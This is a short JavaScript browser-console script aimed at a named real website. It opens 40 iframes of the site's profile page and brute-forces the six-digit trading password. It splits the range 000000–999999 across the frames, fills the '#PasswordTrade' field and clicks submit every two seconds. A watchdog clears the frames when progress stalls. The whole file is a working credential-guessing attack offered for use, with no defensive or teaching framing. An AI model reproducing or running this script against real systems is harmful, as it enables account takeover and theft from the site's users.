// make iframe
let $ = window.$
const body = $('body')
for (let index = 0; index < 40; index++) {
  body.append(`<iframe src="https://www.ccp100.com/profile/info" width="300" height="300">
    &amp;lt;p&amp;gt;Your browser does not support iframes.&amp;lt;/p&amp;gt;
  </iframe>`)
}

// init Data set
const startArr = [0, 25000, 50000, 75000,
  100000, 125000, 150000, 175000,
  200000, 225000, 250000, 275000,
  300000, 325000, 350000, 375000,
  400000, 425000, 450000, 475000,
  500000, 525000, 550000, 575000,
  600000, 625000, 650000, 675000,
  700000, 725000, 750000, 775000,
  800000, 825000, 850000, 875000,
  900000, 925000, 950000, 975000]
// [1214, 26214, 51214, 76214, 101214, 126214,
// 151213, 176213, 201213, 226213, 251213,
// 276213, 301213, 326213, 351213, 376213,
// 401213, 426213, 451213, 476213, 501213, 526213, 551213, 576212, 601211,
// 626211, 651211, 676210, 701210, 726210, 751210, 776210, 801210, 826210,
// 851210, 876210, 901209, 926206, 951206, 976205]
const backup = new Array(40)
const check = new Array(40)

// do it
function core (password, input, start) {
  let gap = 0
  setInterval(() => {
    gap++
    if (gap > 1000) {
      gap = 0
      backup[start] = startArr[start]
    }
    password.value = big6(startArr[start]++)
    if (startArr[start] >= 1000000) {
      startArr[start] -= 1000000
    }
    input.click()
  }, 2000)
}

function big6 (val) {
  if (val > 100000) {
    return val
  } else {
    return '000000'.slice(String(val).length) + val
  }
}

function compare () {
  for (let index in startArr) {
    if (check[index] !== startArr[index]) {
      check[index] = startArr[index]
    } else {
      console.log(check)
      console.warn('SomeThing Happen in iframes' + index)
      $('iframe').remove()
      return false
    }
  }
  console.log(check)
}

let iframess = $('iframe')
for (let index = 0; index < 40; index++) {
  const aframe = iframess[index]
  let password = $(aframe).contents().find('#PasswordTrade')[0]
  let input = $(aframe).contents().find('#btnSubmit')[0]
  core(password, input, index)
}
setInterval(compare, 3 * 60 * 1000)
